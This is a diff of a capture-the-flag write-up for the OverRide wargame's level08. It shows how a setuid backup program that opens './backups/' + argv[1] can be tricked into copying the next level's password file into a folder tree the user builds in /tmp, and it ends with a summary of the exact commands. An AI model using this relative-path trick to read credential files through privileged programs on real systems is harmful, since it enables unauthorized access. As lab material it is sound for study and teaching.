@@ -1,14 +1,22 @@
 
-=> The program try to open the first argument prefixed by "./backups/" like "./backups/" + argv[1]  
-=> We can't open the flag pass directly because the folders ("...home/user/...") doesn't exist in the home folder 
+=> The program try to open the first argument prefixed by "./backups/" like "./backups/" + argv[1]
+=> We can't open the flag pass directly because the folders ("...home/user/...") doesn't exist in the home folder
 level08@OverRide:~$ ./level08 /home/users/level09/.pass
 ERROR: Failed to open ./backups//home/users/level09/.pass
 
 => Let's switch to /tmp and create a this folder structure
 mkdir -p ./backups/home/users/level09/
 
-=> We execute the program with our new backups struct 
+=> We execute the program with our new backups struct
 ~/level08 /home/users/level09/.pass
 
 => It works ! The "./backups//home/users/level09/.pass" is resolved by our folders structure
+cat ./backups/home/users/level09/.pass
+
+
+--------------------------------------------------------------------------
+
+cd /tmp
+mkdir -p ./backups/home/users/level09
+~/level08 /home/users/level09/.pass
 cat ./backups/home/users/level09/.pass
